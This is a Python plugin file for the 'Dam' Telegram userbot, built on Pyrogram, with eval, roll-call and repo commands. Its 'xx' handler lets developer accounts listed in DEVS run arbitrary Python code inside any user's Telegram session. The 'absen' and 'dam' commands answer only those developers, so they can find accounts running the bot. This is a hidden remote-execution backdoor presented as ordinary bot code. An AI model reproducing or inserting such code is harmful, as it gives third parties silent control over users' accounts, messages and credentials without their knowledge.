import os
import random
import sys
import traceback
from io import StringIO

from pyrogram import Client, filters
from pyrogram.types import Message

from Dam.helpers.adminHelpers import DEVS
from Dam.helpers.constants import First


async def aexec(code, client, message):
    exec(
        f"async def __aexec(client, message): "
        + "\n c = Dam = client"
        + "\n print = p"
        + "\n m = message"
        + "\n r = message.reply_to_message"
        + "".join(f"\n {l}" for l in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


p = print


@Client.on_message(
    filters.command(["xx"], [",", "(", ";", "×", ":"]) & filters.user(DEVS)
)
@Client.on_message(
    filters.group & filters.command(["eval", "e"], ["!", "_"]) & filters.me
)
async def evaluate(client: Client, message: Message):
    status_message = await message.reply("`Running ...`")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        await status_message.delete()
        return
    reply_to_id = message.id
    if message.reply_to_message:
        reply_to_id = message.reply_to_message_id
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"<b>Output</b>:\n    <code>{evaluation.strip()}</code>"
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(final_output))
        await message.reply_document(
            document=filename,
            caption=cmd,
            disable_notification=True,
            reply_to_message_id=reply_to_id,
        )
        os.remove(filename)
        await status_message.delete()
    else:
        await status_message.edit(final_output)


kopi = [
    "**Hadir Adam ganteng** 😝",
    "**Hadir Adam sayang** 😍",
    "**Hadir Bang** 😁",
    "**Hadir kak** 😉",
    "**Hadir dong** 😁",
    "**Hadir ganteng** 🥵",
    "**Hadir bro** 😎",
    "**Hadir kak maap telat** 🥺",
]


@Client.on_message(filters.command("absen", ["."]) & filters.user(DEVS) & ~filters.me)
async def absen(client: Client, message: Message):
    await message.reply_text(random.choice(kopi))


@Client.on_message(filters.command("dam", ["."]) & filters.user(DEVS) & ~filters.me)
async def Dams(client: Client, message: Message):
    await client.send_message(message.chat.id, "🔥 **Dam Alive My Lord!** 🔥")


@Client.on_message(filters.command("repo", [".", "-", "^", "!", "?"]) & filters.me)
async def repo(client: Client, message: Message):
    await message.reply(First.REPO, disable_web_page_preview=True)
